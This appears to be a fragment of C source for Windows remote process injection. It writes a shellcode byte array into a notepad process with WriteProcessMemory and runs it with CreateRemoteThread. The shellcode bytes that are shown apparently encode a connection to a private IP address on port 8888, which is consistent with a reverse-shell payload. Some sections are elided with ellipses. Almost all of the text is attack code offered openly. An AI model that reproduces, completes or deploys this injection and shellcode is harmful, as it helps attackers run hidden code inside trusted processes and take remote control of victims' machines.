//Remote Process Injection - Injecting the Process into the local process(ex: notepad inside(backgroud) shellcode).
//Injecting the shellcode inside of the notepad.
#include <stdio.h>
#include <windows.h>
...
int main()
{
    //Shellcode variable initialization
    char shellcode[] = {
        ...
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\xc0\xa8\x01\x34"
    ...
    HANDLE hThread; // Handle to store injected process handle.
    ...
    //Now, will call writeprocessmemory function.
    WriteProcessMemory(hProcess, exec_mem, shellcode, shellcode_size, NULL);

    //Now, will call create remote thread process.
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

    //Close the handlers and Terminate the code excution.
